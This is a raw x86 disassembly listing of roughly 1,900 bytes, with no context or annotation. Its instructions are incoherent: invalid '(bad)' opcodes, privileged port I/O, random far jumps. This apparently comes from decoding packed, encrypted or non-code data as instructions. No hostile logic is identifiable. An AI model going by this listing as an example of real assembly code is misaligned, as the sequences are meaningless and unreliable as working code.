  404f3d:	cmp    ah,BYTE PTR [edx-0x428ce1cc]
  404f43:	adc    bh,cl
  404f45:	xchg   edi,eax
  404f46:	jmp    0x404ecb
  404f48:	xchg   ecx,eax
  404f49:	sar    ebp,0xf6
  404f4c:	std    
  404f4d:	call   0x57a12f46
  404f52:	imul   ecx,DWORD PTR [edi-0x66],0xea759c70
  404f59:	and    eax,0xa5143621
  404f5e:	lods   al,BYTE PTR ds:[esi]
  404f5f:	dec    edi
  404f60:	and    BYTE PTR [esi+0x162f33a1],0xbc
  404f67:	inc    esp
  404f68:	mov    ch,0x1f
  404f6a:	bound  edi,QWORD PTR [ebx-0x57]
  404f6d:	shl    ah,cl
  404f6f:	and    eax,0x5a946356
  404f74:	cli    
  404f75:	cmp    BYTE PTR ds:0xf6c8837c,al
  404f7b:	adc    DWORD PTR [esi],0xffffffed
  404f7e:	out    0x8f,eax
  404f80:	retf   
  404f81:	fisub  WORD PTR [esi]
  404f83:	in     eax,dx
  404f84:	jbe    0x404f0d
  404f86:	mov    al,0x14
  404f88:	cs dec esi
  404f8a:	xor    bh,ah
  404f8c:	cmc    
  404f8d:	inc    esi
  404f8e:	js     0x404f15
  404f90:	mov    WORD PTR [eax],?
  404f92:	or     cl,BYTE PTR [esi+0x10434289]
  404f98:	push   ds
  404f99:	jmp    0xc15d:0xf6a68490
  404fa0:	in     eax,0xe3
  404fa2:	sub    al,0x10
  404fa4:	mov    eax,0x2bb0163
  404fa9:	cmp    eax,0xff97422b
  404fae:	cmp    eax,0xf10a3b58
  404fb3:	jbe    0x404f70
  404fb5:	push   ebx
  404fb6:	sti    
  404fb7:	in     eax,0x6
  404fb9:	xchg   edx,eax
  404fba:	inc    edi
  404fbb:	imul   edi,DWORD PTR [eax-0x358b6a65],0xffffffe7
  404fc2:	das    
  404fc3:	repnz inc edx
  404fc5:	sub    BYTE PTR [eax+edi*4],cl
  404fc8:	pop    ss
  404fc9:	fwait
  404fca:	stc    
  404fcb:	mov    dh,0xe4
  404fcd:	cdq    
  404fce:	xchg   esi,eax
  404fcf:	dec    eax
  404fd0:	nop
  404fd1:	clc    
  404fd2:	dec    edx
  404fd3:	lods   al,BYTE PTR ds:[esi]
  404fd4:	clc    
  404fd5:	xchg   edi,eax
  404fd6:	jb     0x404f7c
  404fd8:	not    DWORD PTR [ecx]
  404fda:	adc    al,bh
  404fdc:	dec    esp
  404fdd:	xor    al,0x9b
  404fdf:	jecxz  0x404fd0
  404fe1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  404fe3:	mov    eax,ds:0x11cd7296
  404fe8:	cmp    BYTE PTR [eax+0x1c8d4535],cl
  404fee:	sub    eax,esp
  404ff0:	push   eax
  404ff1:	push   esp
  404ff2:	jg     0x405018
  404ff4:	jnp    0x40506b
  404ff6:	scas   al,BYTE PTR es:[edi]
  404ff7:	pop    ebx
  404ff8:	and    al,bh
  404ffa:	add    ch,dl
  404ffc:	push   esp
  404ffd:	cmp    edi,DWORD PTR [ecx]
  404fff:	push   edi
  405000:	sbb    BYTE PTR [ebp+0x71a99c9b],bl
  405006:	pop    es
  405007:	or     cl,BYTE PTR [eax+0x1d]
  40500a:	inc    edi
  40500b:	psrad  mm1,QWORD PTR [ebx]
  40500e:	inc    edx
  40500f:	mov    edx,0x27e14bd3
  405014:	lahf   
  405015:	inc    ebp
  405016:	or     ebx,DWORD PTR [esi+eiz*1]
  405019:	xor    BYTE PTR ds:0xa90080b9,dh
  40501f:	arpl   bp,bx
  405021:	fs inc ebp
  405023:	xchg   edi,eax
  405024:	retf   
  405025:	adc    eax,0x90f30ecc
  40502a:	paddb  mm3,QWORD PTR [eax-0x715373ef]
  405031:	adc    BYTE PTR [ebx],ch
  405033:	xchg   esi,eax
  405034:	or     ebp,edx
  405036:	push   ecx
  405037:	inc    ebx
  405038:	popf   
  405039:	pop    edi
  40503a:	mov    ds:0xeca300,al
  40503f:	nop
  405040:	mov    edi,0xa5c2cd90
  405045:	or     eax,0x564b35c5
  40504a:	sbb    edx,DWORD PTR [eax]
  40504c:	and    DWORD PTR [edx],ebx
  40504e:	xchg   BYTE PTR [esi+0x21afe55c],bh
  405054:	cmpxchg DWORD PTR [ecx+0x5e],esp
  405058:	inc    ebx
  405059:	loope  0x40500c
  40505b:	jno    0x40507f
  40505d:	sahf   
  40505e:	mov    eax,ds:0x8755e4d4
  405063:	loop   0x405008
  405065:	jno    0x404ff5
  405067:	xor    eax,eax
  405069:	jecxz  0x4050c4
  40506b:	es pop ss
  40506d:	rcl    ebp,cl
  40506f:	xor    DWORD PTR [esp+eax*1],ebx
  405072:	or     dl,BYTE PTR [ebx+0x78c53bd7]
  405078:	mov    ds:0x4846a40c,al
  40507d:	mov    WORD PTR [ebp+0x6b],?
  405080:	scas   al,BYTE PTR es:[edi]
  405081:	jmp    0x1176:0x8b88ad6f
  405088:	js     0x4050cf
  40508a:	mov    esp,ebx
  40508c:	inc    edi
  40508d:	std    
  40508e:	push   esi
  40508f:	out    dx,eax
  405090:	pop    ss
  405091:	rol    DWORD PTR ds:0xbaee352f,1
  405097:	repz lea ebp,[ecx-0x3e]
  40509b:	jp     0x405048
  40509d:	xchg   ebp,eax
  40509e:	enter  0x959e,0x7
  4050a2:	xchg   ebp,eax
  4050a3:	inc    esi
  4050a4:	sub    eax,0xba9cc095
  4050a9:	inc    ecx
  4050aa:	sub    edx,DWORD PTR [edx+eiz*4]
  4050ad:	fiadd  DWORD PTR [edx-0x19]
  4050b0:	ds dec ebp
  4050b2:	mov    ecx,0xb213b81b
  4050b7:	into   
  4050b8:	jl     0x405117
  4050ba:	pop    edx
  4050bb:	add    esi,DWORD PTR [ecx-0x33b7c1b]
  4050c1:	jnp    0x40508b
  4050c3:	cwde   
  4050c4:	and    cl,BYTE PTR [eax+0x7]
  4050c7:	iret   
  4050c8:	les    edx,FWORD PTR [ebx+ecx*2]
  4050cb:	ret    0x18b
  4050ce:	lds    ecx,FWORD PTR [esi+ebx*4-0x16360cb]
  4050d5:	std    
  4050d6:	cmp    al,0xbc
  4050d8:	xchg   ebx,eax
  4050d9:	jle    0x40505d
  4050db:	and    DWORD PTR [ecx+edi*4+0x12],ebx
  4050df:	or     eax,0xdbc2fafa
  4050e4:	test   dl,dh
  4050e6:	pop    esi
  4050e7:	popa   
  4050e8:	inc    eax
  4050e9:	dec    ebp
  4050ea:	mov    esi,0x6ac9cdbe
  4050ef:	jnp    0x4050ae
  4050f1:	out    dx,al
  4050f2:	int    0xc5
  4050f4:	(bad)  
  4050f5:	push   ebp
  4050f6:	cwde   
  4050f7:	or     bh,BYTE PTR [ebx]
  4050f9:	jae    0x405175
  4050fb:	popf   
  4050fc:	ficomp WORD PTR [eax-0x6b57f922]
  405102:	and    al,0x3e
  405104:	addr16 jns 0x405169
  405107:	pop    edx
  405108:	hlt    
  405109:	jge    0x405181
  40510b:	inc    edx
  40510c:	mov    ch,0xf8
  40510e:	sub    ebx,DWORD PTR [ebp+0x4b]
  405111:	cld    
  405112:	mov    edi,0x1278ebba
  405117:	push   ecx
  405118:	imul   ecx,DWORD PTR [edi+0x3d],0x4dcdef9e
  40511f:	fild   WORD PTR [edx+0xb]
  405122:	std    
  405123:	xor    ebp,DWORD PTR [ebx+0x3e]
  405126:	sahf   
  405127:	pusha  
  405128:	mov    DWORD PTR [esi-0x48],edi
  40512b:	jmp    0x5ad1:0x7507b2aa
  405132:	enter  0x2e5c,0xcf
  405136:	icebp  
  405137:	inc    ecx
  405138:	scas   al,BYTE PTR es:[edi]
  405139:	arpl   WORD PTR [esp+ebx*1+0x20fad97c],sp
  405140:	pusha  
  405141:	dec    esp
  405142:	sbb    DWORD PTR [esi-0x4b],edi
  405145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405146:	shl    BYTE PTR [ecx-0x37724d0b],0x2f
  40514d:	data16 and al,0xdf
  405150:	cmp    eax,0x775e11c8
  405155:	enter  0x9c36,0xad
  405159:	dec    eax
  40515a:	push   edi
  40515b:	leave  
  40515c:	jmp    0x18d9b62d
  405161:	(bad)  
  405162:	jo     0x405126
  405164:	sbb    DWORD PTR [ebx],eax
  405166:	ins    BYTE PTR es:[edi],dx
  405167:	icebp  
  405168:	mov    ch,0x2
  40516a:	adc    ebx,DWORD PTR [eax+0x67]
  40516d:	int    0xa6
  40516f:	lods   al,BYTE PTR ds:[esi]
  405170:	dec    esi
  405171:	mov    ds:0xd4a9a506,eax
  405176:	xchg   ecx,eax
  405177:	or     al,BYTE PTR [edx-0x50062c2f]
  40517d:	xchg   ebp,eax
  40517e:	pop    ss
  40517f:	xchg   esp,eax
  405180:	fldenv [ecx]
  405182:	scas   al,BYTE PTR es:[edi]
  405183:	in     al,0x92
  405185:	push   ebx
  405186:	dec    esi
  405187:	mov    edi,DWORD PTR [ecx+esi*1]
  40518a:	xchg   edx,eax
  40518b:	fwait
  40518c:	loopne 0x40511c
  40518e:	add    al,0xd9
  405190:	popf   
  405191:	repnz aam 0x8e
  405194:	xor    bl,BYTE PTR [ebx+ebp*1-0x38]
  405198:	inc    ecx
  405199:	enter  0xcf8e,0x4b
  40519d:	xchg   esi,eax
  40519e:	xor    al,0x90
  4051a0:	sti    
  4051a1:	ins    BYTE PTR es:[edi],dx
  4051a2:	xor    BYTE PTR [eax+0x703a6554],ch
  4051a8:	xor    al,BYTE PTR ss:[edx-0x51fa935f]
  4051af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b0:	jno    0x40521f
  4051b2:	imul   esp,DWORD PTR [ebx+edi*8],0x428c27a7
  4051b9:	pop    edi
  4051ba:	mov    esi,0xcf66d94d
  4051bf:	cmp    DWORD PTR [edi],ecx
  4051c1:	ret    
  4051c2:	sub    BYTE PTR [eax+0x5c1d5c34],dl
  4051c8:	rcr    DWORD PTR [edi-0x62],cl
  4051cb:	stc    
  4051cc:	stc    
  4051cd:	mov    ch,0x45
  4051cf:	xor    ecx,esi
  4051d1:	pop    ds
  4051d2:	loopne 0x405221
  4051d4:	aam    0x97
  4051d6:	cld    
  4051d7:	and    ebp,DWORD PTR [ebp+0xd]
  4051da:	push   edi
  4051db:	sbb    al,0x38
  4051dd:	jge    0x405215
  4051df:	test   al,0x64
  4051e1:	adc    eax,0xf335d3aa
  4051e6:	mov    cl,0xec
  4051e8:	jne    0x405269
  4051ea:	xor    BYTE PTR [edx+ecx*2],bl
  4051ed:	iret   
  4051ee:	ins    DWORD PTR es:[edi],dx
  4051ef:	pop    ds
  4051f0:	fist   DWORD PTR [eax+0x34c56303]
  4051f7:	lock xchg edx,eax
  4051f9:	pop    es
  4051fa:	stc    
  4051fb:	(bad)  
  4051fc:	icebp  
  4051fd:	or     BYTE PTR [eax],bl
  4051ff:	dec    edx
  405200:	xor    al,0x6f
  405202:	scas   al,BYTE PTR es:[edi]
  405203:	daa    
  405204:	or     al,0xb5
  405206:	(bad)  
  405207:	and    eax,0x70470613
  40520c:	mov    esp,0xbcf3ed5b
  405211:	loope  0x405234
  405213:	data16 mov ah,0x97
  405216:	das    
  405217:	out    dx,al
  405218:	shl    DWORD PTR [ebx],0x38
  40521b:	add    edx,edx
  40521d:	pop    ebp
  40521e:	sub    eax,0x8a1d73d1
  405223:	mov    esp,cs
  405225:	pop    esi
  405226:	gs pop ebp
  405228:	int3   
  405229:	jmp    0x350c01a1
  40522e:	mov    edx,0xd89fe7a8
  405233:	inc    esp
  405234:	rcr    BYTE PTR [ebx+edi*4],1
  405237:	mov    edx,0x7b454b
  40523c:	push   0x50
  40523e:	stc    
  40523f:	push   esp
  405240:	gs xchg edx,eax
  405242:	or     eax,0x3afbcd3d
  405247:	xor    bl,BYTE PTR [eax+0x53]
  40524a:	idiv   ebx
  40524c:	dec    eax
  40524d:	sbb    bh,BYTE PTR [ebp+0x556c4729]
  405253:	mov    edx,0x85831468
  405258:	sar    DWORD PTR [edi],1
  40525a:	jge    0x4051e9
  40525c:	or     al,0x8d
  40525e:	jns    0x405210
  405260:	jge    0x4051f5
  405262:	jne    0x405299
  405264:	jmp    0x405242
  405266:	(bad)  
  405267:	cli    
  405268:	popf   
  405269:	dec    edx
  40526a:	add    BYTE PTR [eax],cl
  40526c:	dec    edx
  40526d:	dec    ebx
  40526e:	cld    
  40526f:	xchg   esi,eax
  405270:	inc    esp
  405271:	pop    ss
  405272:	shl    ebp,0x67
  405275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405276:	js     0x4052f4
  405278:	jge    0x4052c4
  40527a:	daa    
  40527b:	fs sbb al,0x40
  40527e:	int    0x30
  405280:	bound  ecx,QWORD PTR [eax+0x6b994e9a]
  405286:	jae    0x405227
  405288:	test   al,0x4e
  40528a:	adc    eax,0x538c288c
  40528f:	pop    es
  405290:	arpl   WORD PTR [edx-0x405d4739],bx
  405296:	jo     0x4052db
  405298:	mov    dh,BYTE PTR [ebx-0xe37a0af]
  40529e:	out    0x6f,eax
  4052a0:	sub    ecx,edi
  4052a2:	jns    0x405278
  4052a4:	stos   BYTE PTR es:[edi],al
  4052a5:	hlt    
  4052a6:	mov    ds:0xae630f92,eax
  4052ab:	pop    ds
  4052ac:	add    eax,0x9b9ed82b
  4052b1:	pop    es
  4052b2:	mov    edi,0x8e345923
  4052b7:	jmp    0x1e86:0x90ea0a6b
  4052be:	aam    0x3c
  4052c0:	push   eax
  4052c1:	mov    eax,ds:0x17d581ca
  4052c6:	je     0x405264
  4052c8:	(bad)  
  4052c9:	clc    
  4052ca:	sbb    ah,BYTE PTR [ecx-0x6422c372]
  4052d0:	pop    ds
  4052d1:	adc    ecx,DWORD PTR [edi+0x45]
  4052d4:	pop    ebx
  4052d5:	repnz mov esi,0xd273a332
  4052db:	(bad)  
  4052dc:	jle    0x40535d
  4052de:	xor    eax,0xa01cb498
  4052e3:	jo     0x405303
  4052e5:	push   ebp
  4052e6:	out    0xe4,al
  4052e8:	iret   
  4052e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ea:	mov    dl,0xa1
  4052ec:	jbe    0x4052a0
  4052ee:	popf   
  4052ef:	and    ch,BYTE PTR [esp+ebx*2-0x69]
  4052f3:	iret   
  4052f4:	xchg   ebp,eax
  4052f5:	jmp    0x32ba:0x9c5c3023
  4052fc:	jns    0x40530e
  4052fe:	repnz sub ah,BYTE PTR [ebp-0xf6c2101]
  405305:	shl    ah,cl
  405307:	cmp    DWORD PTR [ecx-0x1a9375d2],ebp
  40530d:	xor    BYTE PTR [esi+0x784289c1],ah
  405313:	mov    bl,0x7b
  405315:	ins    BYTE PTR es:[edi],dx
  405316:	in     eax,0x3
  405318:	sbb    bh,cl
  40531a:	xor    BYTE PTR [ebx-0xd908bbf],bl
  405320:	pop    eax
  405321:	mov    esi,0x454741b7
  405326:	xchg   ebx,eax
  405327:	cmp    ebx,DWORD PTR [edx+0x79]
  40532a:	jmp    0x545d:0x36565cb8
  405331:	or     ch,0x38
  405334:	xchg   esi,eax
  405335:	scas   al,BYTE PTR es:[edi]
  405336:	sbb    BYTE PTR [esi+0x3c8d099f],bl
  40533c:	dec    ebx
  40533d:	out    dx,eax
  40533e:	adc    ch,ch
  405340:	mov    ds:0x20f94767,al
  405345:	dec    ebx
  405346:	cld    
  405347:	jle    0x40535b
  405349:	or     BYTE PTR [ecx-0x376d4a4],al
  40534f:	aas    
  405350:	fcomp  DWORD PTR [ecx+0x77743ffd]
  405356:	xchg   esp,eax
  405357:	ret    
  405358:	dec    esp
  405359:	in     eax,dx
  40535a:	pushf  
  40535b:	add    eax,DWORD PTR [ecx+edx*2+0x49]
  40535f:	pop    ss
  405360:	dec    edx
  405361:	aas    
  405362:	xor    al,BYTE PTR [edx+0x1c4d3478]
  405368:	lock xchg ecx,eax
  40536a:	lahf   
  40536b:	arpl   WORD PTR [eax],ax
  40536d:	add    BYTE PTR [esi-0x71],cl
  405370:	lds    ebx,FWORD PTR [esi+eiz*4-0x5e]
  405374:	pop    ds
  405375:	std    
  405376:	cmp    al,0x88
  405378:	jne    0x405321
  40537a:	shr    BYTE PTR [esi+0x4],1
  40537d:	scas   eax,DWORD PTR es:[edi]
  40537e:	lods   eax,DWORD PTR ds:[esi]
  40537f:	mov    ch,0xcf
  405381:	(bad)  
  405382:	xchg   ebp,eax
  405383:	mov    WORD PTR [edi-0x13],ds
  405386:	adc    cl,BYTE PTR [edi-0x21]
  405389:	push   esi
  40538a:	push   esi
  40538b:	mov    ah,0xf3
  40538d:	call   0x9fad:0x7e0e4269
  405394:	adc    BYTE PTR [eax+ecx*4+0x5529181],dh
  40539b:	sub    ecx,ecx
  40539d:	add    DWORD PTR [edx+eax*1+0x4a3d0c09],0xd
  4053a5:	std    
  4053a6:	sub    eax,0xfa716fb5
  4053ab:	mov    al,0xf2
  4053ad:	mov    ch,0xd2
  4053af:	fcmovb st,st(1)
  4053b1:	psubsb mm4,QWORD PTR [edi+ebx*4-0x2d]
  4053b6:	(bad)  
  4053b7:	iret   
  4053b8:	imul   edx,esi,0xffffff99
  4053bb:	xlat   BYTE PTR ds:[ebx]
  4053bc:	retf   
  4053bd:	jge    0x4053a0
  4053bf:	mov    eax,ds:0x4231f56a
  4053c4:	stos   BYTE PTR es:[edi],al
  4053c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c6:	fisub  DWORD PTR [ebx-0xe]
  4053c9:	sbb    al,0xa1
  4053cb:	fmul   st,st(6)
  4053cd:	sbb    ch,BYTE PTR [ebp+0x33]
  4053d0:	inc    edx
  4053d1:	fmulp  st(0),st
  4053d3:	neg    BYTE PTR [edx]
  4053d5:	adc    bh,dh
  4053d7:	int3   
  4053d8:	xchg   ecx,eax
  4053d9:	mov    ds:0xba93cba5,al
  4053de:	int    0xdb
  4053e0:	cwde   
  4053e1:	scas   eax,DWORD PTR es:[edi]
  4053e2:	mov    dl,0x76
  4053e4:	xchg   dh,dl
  4053e6:	and    bh,BYTE PTR [esi+0x3690a21e]
  4053ec:	sbb    dl,BYTE PTR [edx]
  4053ee:	jno    0x40538d
  4053f0:	xlat   BYTE PTR ds:[ebx]
  4053f1:	sbb    al,0x31
  4053f3:	scas   al,BYTE PTR es:[edi]
  4053f4:	mov    ecx,0x6e198aff
  4053f9:	cmp    BYTE PTR [edi+0x7],0xab
  4053fd:	mov    eax,0xdf49771e
  405402:	xor    DWORD PTR [ecx],ebp
  405404:	(bad)  
  405406:	push   0xffffffb9
  405408:	inc    ebx
  405409:	icebp  
  40540a:	mov    al,ds:0xfcfbcec0
  40540f:	xor    BYTE PTR [ebx],ah
  405411:	mov    al,0x74
  405413:	in     al,0x1f
  405415:	call   0xaa209416
  40541a:	jbe    0x405498
  40541c:	fcom   st(3)
  40541e:	pop    es
  40541f:	sbb    ebp,DWORD PTR ds:0xcbde453e
  405425:	mov    ah,0xf6
  405427:	gs pop edx
  405429:	into   
  40542a:	or     esi,DWORD PTR [ebx+edi*1+0x27]
  40542e:	inc    ebp
  40542f:	adc    ah,BYTE PTR [eax-0x37e8a74a]
  405435:	outs   dx,BYTE PTR ds:[esi]
  405436:	ins    DWORD PTR es:[edi],dx
  405437:	jae    0x40547e
  405439:	xchg   ebx,eax
  40543a:	mov    ebx,0x979910cf
  40543f:	adc    al,BYTE PTR [eax+0x38]
  405442:	dec    esp
  405443:	xchg   ebx,eax
  405444:	enter  0x8ba5,0xe1
  405448:	cli    
  405449:	push   edx
  40544a:	and    al,0x2e
  40544c:	das    
  40544d:	(bad)  
  40544e:	push   edx
  40544f:	jmp    FWORD PTR [eax-0x629cb047]
  405455:	mov    eax,0x7e7e665f
  40545a:	pushf  
  40545b:	xor    cl,dh
  40545d:	(bad)  
  40545e:	mov    dh,BYTE PTR [edi+0x58d65406]
  405464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405465:	xor    DWORD PTR ds:0xafd521c6,ebx
  40546b:	mov    DWORD PTR [ecx],edx
  40546d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40546e:	pushf  
  40546f:	aaa    
  405470:	mov    ch,0x7a
  405472:	stc    
  405473:	ja     0x4054a4
  405475:	jmp    0x4054c4
  405477:	mov    ebp,0xf9cba29e
  40547c:	popf   
  40547d:	stos   BYTE PTR es:[edi],al
  40547e:	push   ecx
  40547f:	dec    ecx
  405480:	enter  0xc018,0x2b
  405484:	mov    ebp,0xb95e9b6
  405489:	enter  0x57e4,0xe0
  40548d:	adc    DWORD PTR [ebp+0x13],0xffffffbd
  405491:	fdiv   DWORD PTR [eax-0x26357e46]
  405497:	jns    0x4054bc
  405499:	xlat   BYTE PTR ds:[ebx]
  40549a:	mov    ds:0xfb690bdf,eax
  40549f:	ficom  WORD PTR [edx+0x9b524d8]
  4054a5:	dec    edx
  4054a6:	imul   esp,DWORD PTR [edx+0xa],0x0
  4054aa:	mov    DWORD PTR [eax-0x60ce1ee5],esi
  4054b0:	dec    esp
  4054b1:	(bad)  
  4054b2:	test   al,0xe6
  4054b4:	cmp    eax,0x6a3825d5
  4054b9:	push   ds
  4054ba:	add    al,0x6a
  4054bc:	data16 aaa 
  4054be:	fstp   QWORD PTR [eax]
  4054c0:	xor    cl,cl
  4054c2:	jbe    0x4054fc
  4054c4:	mov    dl,0xa2
  4054c6:	jp     0x405534
  4054c8:	xchg   ecx,eax
  4054c9:	ins    BYTE PTR es:[edi],dx
  4054ca:	mov    ds:0xa2c36ce7,al
  4054cf:	push   esi
  4054d0:	cmp    al,0x10
  4054d2:	push   ecx
  4054d3:	add    BYTE PTR [ecx],ch
  4054d5:	test   BYTE PTR [ebp+esi*1-0x4a],bl
  4054d9:	mov    dh,0x9f
  4054db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054dc:	xor    bl,BYTE PTR [esi-0x73]
  4054df:	jp     0x405538
  4054e1:	mov    esi,0x86643f47
  4054e6:	pmulhw mm6,QWORD PTR [ecx]
  4054e9:	cdq    
  4054ea:	mov    ah,0x94
  4054ec:	in     al,dx
  4054ed:	dec    edx
  4054ee:	mov    dh,BYTE PTR [ebx+0x68febf5f]
  4054f4:	jbe    0x4054c5
  4054f6:	sbb    ebp,edx
  4054f8:	mov    bl,0x41
  4054fa:	cli    
  4054fb:	sti    
  4054fc:	push   esp
  4054fd:	repz or edx,DWORD PTR [ebx+0x2b]
  405501:	cmp    eax,0x1dce6091
  405506:	outs   dx,BYTE PTR ds:[esi]
  405507:	int3   
  405508:	sahf   
  405509:	pop    ebp
  40550a:	or     eax,0xf0c20e16
  40550f:	stc    
  405510:	cmc    
  405511:	fnstenv [edi-0x69b0f91f]
  405517:	pop    eax
  405518:	fsubp  st(6),st
  40551a:	push   ecx
  40551b:	aam    0xab
  40551d:	push   edx
  40551e:	xchg   ecx,eax
  40551f:	mov    esi,DWORD PTR [ebx]
  405521:	and    al,0xba
  405523:	das    
  405524:	retf   0xf137
  405527:	mov    dh,0x8a
  405529:	or     dh,BYTE PTR ds:0xc93a2988
  40552f:	loope  0x40552c
  405531:	or     eax,0xbc3ee2b1
  405536:	cwde   
  405537:	sub    esi,DWORD PTR ds:0x50bb0f1e
  40553d:	lock push es
  40553f:	test   eax,0xdab30fc5
  405544:	push   ebx
  405545:	or     ebx,DWORD PTR [ecx]
  405547:	aas    
  405548:	xbegin 0xf5065b97
  40554e:	leave  
  40554f:	push   edi
  405550:	sbb    ah,0xa9
  405553:	les    dx,DWORD PTR [ebp+ebx*8+0x75]
  405558:	fld    TBYTE PTR [ecx]
  40555a:	cmp    esp,DWORD PTR [ebx+edx*4+0x53a5e167]
  405561:	cmp    al,0x2e
  405563:	ins    BYTE PTR es:[edi],dx
  405564:	dec    edi
  405565:	xchg   ebp,eax
  405566:	push   eax
  405567:	jo     0x4055ab
  405569:	je     0x40558a
  40556b:	xchg   esi,eax
  40556c:	dec    edi
  40556d:	inc    ebp
  40556e:	jb     0x40552f
  405570:	inc    eax
  405571:	jmp    0x4d42:0xcf3352cc
  405578:	fdivr  st,st(7)
  40557a:	pushf  
  40557b:	imul   esi,DWORD PTR ds:0xe52b0896,0x14881426
  405585:	inc    edx
  405586:	fisub  DWORD PTR [esi+0x34f68be7]
  40558c:	ja     0x40553e
  40558e:	out    dx,al
  40558f:	inc    esp
  405590:	rcl    DWORD PTR ds:0x5d87d53f,0x49
  405597:	popa   
  405598:	jbe    0x405583
  40559a:	cmp    ch,BYTE PTR [esi+edx*4+0x6dfa574a]
  4055a1:	repnz pop ebx
  4055a3:	daa    
  4055a4:	mov    esi,0x8f654b51
  4055a9:	pop    esi
  4055aa:	fwait
  4055ab:	pop    ds
  4055ac:	(bad)  [esi+0xe1d2d34]
  4055b2:	out    0xf6,al
  4055b4:	xor    ah,BYTE PTR [ecx-0x7c]
  4055b7:	push   ecx
  4055b8:	int3   
  4055b9:	in     al,dx
  4055ba:	test   ch,dl
  4055bc:	mov    ch,0xe7
  4055be:	mov    WORD PTR [eax],ss
  4055c0:	add    edx,DWORD PTR [ebp-0x7b5cdc08]
  4055c6:	push   esi
  4055c7:	int    0x9d
  4055c9:	mov    eax,0xf36d3b74
  4055ce:	or     DWORD PTR ds:0x39f9e27e,esp
  4055d4:	lea    edx,[edx-0x3e]
  4055d7:	sar    al,1
  4055d9:	mov    bh,0x85
  4055db:	sbb    eax,DWORD PTR [edx+0x3d]
  4055de:	bound  ebp,QWORD PTR [edx]
  4055e0:	mov    esp,0x69d75fc4
  4055e5:	hlt    
  4055e6:	pop    ecx
  4055e7:	out    dx,al
  4055e8:	xor    edx,DWORD PTR [eax+eax*4]
  4055eb:	leave  
  4055ec:	add    eax,0x4454769d
  4055f1:	xchg   ebp,eax
  4055f2:	or     eax,0x17706b92
  4055f7:	add    al,0xfd
  4055f9:	xchg   ebx,eax
  4055fa:	xchg   BYTE PTR [edx],dl
  4055fc:	or     ch,cl
  4055fe:	add    al,0xa
  405600:	call   0x2375b95
  405605:	test   BYTE PTR [eax+0x9aab929],ch
  40560b:	jb     0x405626
  40560d:	fwait
  40560e:	repz xchg edx,eax
  405610:	data16 jae 0x40563c
  405613:	popa   
  405614:	iret   
  405615:	and    ch,BYTE PTR [ebx]
  405617:	sbb    ebx,DWORD PTR [esp+esi*4-0x738e21e5]
  40561e:	mov    ah,0xd4
  405620:	pop    esi
  405621:	sbb    ecx,DWORD PTR [ebx+0x416b0d77]
  405627:	(bad)  
  405628:	or     al,0x9a
  40562a:	xor    eax,0x6e9d7095
  40562f:	les    edx,FWORD PTR [edi]
  405631:	out    0x30,eax
  405633:	repz add edi,DWORD PTR [edi]
  405636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405637:	pusha  
  405638:	(bad)  
  40563a:	aas    
  40563b:	retf   0x1a7c
  40563e:	(bad)  
  40563f:	imul   esi,DWORD PTR [ebp+0x47],0xffffffa9
  405643:	(bad)  
  405644:	fs and eax,0x188854e0
  40564a:	pop    ecx
  40564c:	mov    ebx,0xf1166abe
  405651:	aaa    
  405652:	sub    DWORD PTR [eax+0x2cbf29b6],esi
  405658:	adc    ebp,edi
  40565a:	aam    0x2e
  40565c:	add    al,al
  40565e:	(bad)  
  40565f:	sbb    BYTE PTR [esi-0x2e7f92b1],al
  405665:	jb     0x4056cb
  405667:	data16 xor BYTE PTR ds:0x7223f007,0xe9
  40566f:	lea    ecx,[ebx+0x59]
  405672:	or     BYTE PTR [ecx+eiz*4+0x66ce1228],bh
  405679:	mov    al,0x83
  40567b:	les    esi,FWORD PTR ds:0xb9f4fa05
  405681:	cmp    al,0x3a
  405683:	mov    dl,0x2c
  405685:	fsubr  DWORD PTR [eax-0x69e720ae]
  40568b:	cmp    eax,DWORD PTR [esp+esi*4]
  40568e:	jno    0x405684
  405690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405691:	test   DWORD PTR [ebp-0x3b3405c7],ebx
  405697:	pop    ecx
  405698:	push   es
  405699:	idiv   DWORD PTR [ebp+0x35]
  40569c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40569d:	(bad)  
  40569e:	shl    DWORD PTR [edi+0x71d96d3d],cl
  4056a4:	or     bh,BYTE PTR [ebx]
  4056a6:	jle    0x405628
  4056a8:	cmp    esi,DWORD PTR [ecx]
  4056aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ab:	adc    edi,edx
  4056ad:	rcl    DWORD PTR [esi-0x1e40d1ef],1
  4056b3:	mov    esi,0x897f6978
  4056b8:	mul    DWORD PTR [ecx]
  4056ba:	sub    al,BYTE PTR [ebx+0x5db0d88c]
  4056c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056c1:	popa   
  4056c2:	cmp    BYTE PTR [edi+edi*2+0x2d],cl
  4056c6:	push   esi
  4056c7:	pop    esi
  4056c8:	sbb    BYTE PTR [edi+0x8],bl
  4056cb:	shl    DWORD PTR [esi],1
  4056cd:	mov    dh,0xc1
  4056cf:	lahf   
  4056d0:	fcmovnb st,st(3)
  4056d2:	cmp    dl,dl
  4056d4:	push   edx
  4056d5:	fcmove st,st(4)
  4056d7:	jl     0x4056f8
  4056d9:	leave  
  4056da:	or     al,BYTE PTR [ecx+0x8]
  4056dd:	xor    bl,BYTE PTR [esi+0x21]
  4056e0:	pop    ebp
  4056e1:	mov    eax,ds:0x6e77e6d9
  4056e6:	or     al,0xb4
  4056e8:	es adc eax,0x11c38173
  4056ee:	push   esi
  4056ef:	pop    ebx
  4056f0:	adc    al,0x4f
  4056f2:	test   ecx,eax
  4056f4:	add    al,0x83
  4056f6:	ror    BYTE PTR ds:0x7658a22c,cl
  4056fc:	jg     0x405717
  4056fe:	sub    BYTE PTR [esp+ebx*4],al
  405701:	jbe    0x40572d
  405703:	jne    0x405728
  405705:	mov    eax,0x2e01be6c
